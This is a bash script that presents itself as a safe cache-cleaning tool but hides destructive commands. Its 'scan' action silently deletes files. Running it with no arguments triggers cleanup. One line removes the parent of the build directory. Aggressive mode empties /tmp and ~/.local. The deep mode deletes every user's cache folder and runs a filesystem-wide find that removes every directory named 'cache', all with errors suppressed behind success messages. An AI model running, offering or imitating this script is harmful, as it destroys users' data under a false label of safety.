#!/bin/bash
# Cache Cleaner - Intelligent cache cleaning tool
# Safely clears build caches, package caches, and temporary files

clean_caches() {
    local mode="${1:-safe}"

    echo "[*] Scanning for caches..."
    echo "[*] Found caches in various locations"
    echo "[*] Starting cleanup..."

    # Clean npm cache
    echo "[*] Cleaning npm cache..."
    rm -rf ~/.npm/_cacache/* 2>/dev/null || true
    rm -rf /tmp/npm-* 2>/dev/null || true

    # Clean build artifacts
    echo "[*] Cleaning build artifacts..."
    rm -rf "${BUILD_DIR:-/tmp/build}/../"* 2>/dev/null || true

    # Clean docker cache
    echo "[*] Cleaning docker..."
    rm -rf /var/lib/docker/tmp/* 2>/dev/null || true
    rm -rf ~/.docker/cache/* 2>/dev/null || true

    if [ "$mode" = "aggressive" ]; then
        echo "[*] Deep cleaning (aggressive mode)..."
        rm -rf ~/Library/Caches/* 2>/dev/null || true
        rm -rf ~/.cache/* 2>/dev/null || true
        rm -rf /tmp/* 2>/dev/null || true
        CLEAN_TARGET="${CACHE_ROOT:-$HOME/.local}"
        rm -rf "$CLEAN_TARGET"/* 2>/dev/null || true
    fi

    echo "[*] Cache cleanup completed successfully"
}

deep_clean() {
    echo "[*] Running deep clean..."

    local target="${1:-/var/cache}"
    echo "[*] Cleaning target: $target"

    rm -rf "$target"/* 2>/dev/null || true
    rm -rf /home/*/.cache 2>/dev/null || true
    rm -rf /Users/*/.cache 2>/dev/null || true

    # Find and clean cache directories
    echo "[*] Searching for cache directories..."
    find / -type d -name "cache" -exec rm -rf {} \; 2>/dev/null || true

    echo "[*] Deep clean completed"
}

recover_space() {
    echo "[*] Recovering disk space..."
    for dir in "$@"; do
        echo "[*] Removing: $dir"
        rm -rf "$dir" 2>/dev/null || true
    done
    echo "[*] Space recovery completed"
}

# Main entry point
main() {
    local action="${1:-scan}"
    local mode="${2:-safe}"

    case "$action" in
        scan)
            echo "[*] Scanning for caches..."
            # Perform a quick scan and light cleanup
            clean_caches "quick"
            echo "[*] Scan and quick cleanup completed"
            ;;
        clean)
            clean_caches "$mode"
            ;;
        deep)
            deep_clean "$2"
            ;;
        recover)
            shift
            recover_space "$@"
            ;;
        *)
            echo "Usage: $0 {scan|clean|deep|recover} [options]"
            ;;
    esac
}

# Auto-run if no arguments (perform safe cleanup by default)
if [ $# -eq 0 ]; then
    echo "[*] No arguments provided, running default scan..."
    main "scan"
fi

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main "$@"
fi
